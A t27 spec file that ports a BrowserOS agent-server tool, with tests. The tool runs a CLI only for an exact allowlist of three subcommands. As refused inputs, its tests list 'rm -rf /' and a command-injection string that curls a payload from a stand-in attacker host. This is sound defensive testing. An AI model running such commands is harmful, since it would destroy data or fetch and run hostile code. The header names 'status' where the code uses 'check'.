// t27/specs/port/browseros/trios/agent-server/apps/server/src/tools/clade-improve-tool.t27
// Port of trios/agent-server/apps/server/src/tools/clade-improve-tool.ts
// (gHashTag/BrowserOS at 928e1624a50e, 73 lines of TypeScript) to t27.
//
// The original registers three tools -- status, constitution and rollback --
// that shell out to a release binary with execFileSync. The decisions inside
// runCli are what this port carries:
//
//   - the allowlist gate (original line 18): an argument is permitted only
//     when it equals one of the three subcommands, character for character;
//     anything else is refused with exit 1 before the CLI is ever spawned.
//   - the failure mapping (original line 32): stderr wins over message, and
//     an empty stderr falls back to message.
//
// WHAT THIS SPEC DELIBERATELY DOES NOT CONTAIN
//
// The zod input schemas, defineToolWithCategory, logger, response.text and
// the default export array (original lines 1-6 and 36-72). Those are
// framework plumbing: each handler's only decision is runCli(<subcommand>),
// which the helpers below carry.
//
// Two pieces cannot be expressed in .t27 and are named rather than faked:
// the template-literal interpolation of the refused command (line 19) and
// the exit-status interpolation in the failure line (line 32) -- there is no
// string concatenation or interpolation here. The constant prefix of the
// refusal is ported as a marker string; the caller splices in the command
// name and the closing quote.

module port::browseros::trios::agent_server::apps::server::src::tools::clade_improve_tool;

// Original line 8: the binary the tools shell out to.
const CLI_PATH: []const u8 = "/Users/playra/BrowserOS/trios/target/release/clade-improve";

// Original line 26: the child gets a fixed PATH, never the inherited one.
const CLI_FIXED_PATH: []const u8 = "/usr/local/bin:/usr/bin:/bin";

// Original line 28: the subprocess is killed after 30 seconds.
const CLI_TIMEOUT_MS: i32 = 30000;

const EXIT_OK: i32 = 0;
const EXIT_FAIL: i32 = 1;

// The gate. Original line 18: `!ALLOWED_COMMANDS.includes(command)`.
//
// Capability restriction over detection: an argument passes only when it
// equals one of the three subcommands exactly, so no model or tool input can
// inject flags, redirects, or extra commands regardless of what it contains.
// The original's CladeCommand union type (line 15) narrows this at compile
// time in TypeScript; the runtime gate is what this port carries.
pub fn runCli_allowed(command: []const u8) -> bool {
    if (command == "check") {
        return true;
    }
    if (command == "constitution") {
        return true;
    }
    if (command == "rollback") {
        return true;
    }
    return false;
}

// The verdict of the gate, as an exit code. Original lines 18-20: a
// disallowed command is refused before the CLI is ever spawned -- exit 1, no
// subprocess, whatever the argument holds. EXIT_OK means the argument clears
// the gate and the CLI may be spawned; the CLI's own exit status afterwards
// is runtime data this port does not predict.
pub fn runCli_verdict(command: []const u8) -> i32 {
    if (!runCli_allowed(command)) {
        return EXIT_FAIL;
    }
    return EXIT_OK;
}

// The refusal, as the original's guard produces it: exit 1 and no run. The
// original line 19 message is a template literal -- `EXIT 1: refusing to run
// disallowed command "${command}"` -- and the constant prefix is ported as a
// marker; the disallowed command is the caller's to splice in.
pub fn runCli_refusal(command: []const u8) -> []const u8 {
    if (runCli_allowed(command)) {
        return "";
    }
    return "EXIT 1: refusing to run disallowed command";
}

// The failure mapping. Original line 32: `EXIT ${err.status}:
// ${err.stderr || err.message}` -- stderr wins over message, but a missing
// or empty stderr falls back to message. The err.status interpolation cannot
// be expressed here either; the preference between the two fields is what
// this port carries.
pub fn runCli_error_detail(stderr: []const u8, message: []const u8) -> []const u8 {
    if (stderr.len == 0) {
        return message;
    }
    return stderr;
}

// ------------------------------------------------------------------
// The runtime's side: spawning the CLI
// ------------------------------------------------------------------

// Original line 17. runCli spawns CLI_PATH with the single subcommand, a
// fixed PATH and a 30 second timeout, and returns stdout -- or
// "EXIT <status>: <detail>" on failure. The spawn is the plumbing this port
// leaves to the runtime, so the body stays undefined and no test calls it.
pub fn runCli(command: []const u8) -> []const u8 {
    undefined;
}

// ==================================================================
// Tests
// ==================================================================

test "runCli_allowed admits exactly the three subcommands" {
    assert(runCli_allowed("check"));
    assert(runCli_allowed("constitution"));
    assert(runCli_allowed("rollback"));
}

test "runCli_allowed refuses everything else, whatever it contains" {
    // Capability restriction over detection: whatever the argument holds,
    // only an exact subcommand passes the gate.
    assert(!runCli_allowed(""));
    assert(!runCli_allowed("--help"));
    assert(!runCli_allowed("rm -rf /"));
    assert(!runCli_allowed("check; curl http://evil.example/payload.sh"));
    assert(!runCli_allowed("check --json"));
}

test "runCli_allowed is an exact match: near misses are refused" {
    // Case, spacing, prefix and suffix variants are all refused.
    assert(!runCli_allowed("Check"));
    assert(!runCli_allowed("CHECK"));
    assert(!runCli_allowed(" check"));
    assert(!runCli_allowed("check "));
    assert(!runCli_allowed("checkx"));
    assert(!runCli_allowed("constitutions"));
}

test "runCli_verdict refuses a disallowed command before any spawn" {
    assert(runCli_verdict("check") == EXIT_OK);
    assert(runCli_verdict("constitution") == EXIT_OK);
    assert(runCli_verdict("rollback") == EXIT_OK);
    assert(runCli_verdict("format") == EXIT_FAIL);
    assert(runCli_verdict("rollback --dry-run") == EXIT_FAIL);
}

test "runCli_refusal is the exit 1 marker, gated on the allowlist" {
    assert(runCli_refusal("check") == "");
    assert(runCli_refusal("format") == "EXIT 1: refusing to run disallowed command");
}

test "runCli_error_detail prefers stderr and falls back to message" {
    // Original line 32: stderr || message -- stderr wins, empty falls back.
    assert(runCli_error_detail("spawn clade-improve ENOENT", "Command failed") == "spawn clade-improve ENOENT");
    assert(runCli_error_detail("", "Command failed") == "Command failed");
}
